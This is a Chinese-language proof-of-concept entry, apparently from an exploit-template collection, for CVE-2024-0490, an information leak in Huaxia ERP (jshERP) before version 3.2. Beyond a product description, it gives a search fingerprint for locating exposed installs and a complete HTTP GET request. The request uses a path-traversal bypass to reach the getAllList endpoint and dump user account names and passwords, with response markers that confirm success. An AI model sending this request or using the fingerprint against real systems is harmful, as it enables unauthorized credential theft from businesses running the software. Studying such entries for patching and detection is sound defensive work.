﻿# 华夏ERP getAllList信息泄露漏洞

> 更新时间：2024-01-17

> 漏洞编号：CVE-2024-0490

> 漏洞说明：华夏ERP基于SpringBoot框架和SaaS模式，立志为中小企业提供开源好用的ERP软件，目前专注进销存+财务功能。主要模块有零售管理、采购管理、销售管理、仓库管理、财务管理、报表查询、系统管理等。支持预付款、收入支出、仓库调拨、组装拆卸、订单等特色功能。拥有库存状况、出入库统计等报表。同时对角色和权限进行了细致全面控制，精确到每个按钮和菜单。该系统存在信息泄露漏洞，攻击者可以通过特定ULR获取系统账号密码。
华夏ERP < 3.2版本

> 漏洞特征：body="jshERP-boot"

> 验证脚本：HTTP

```
GET /jshERP-boot/user/a.ico/../getAllList HTTP/1.1
Connection: close
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Accept-Language: en
sec-ch-ua-platform: Windows
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：loginName

> 上传文件定位：


> 验证文件来源：华夏ERP getAllList信息泄露漏洞.poc
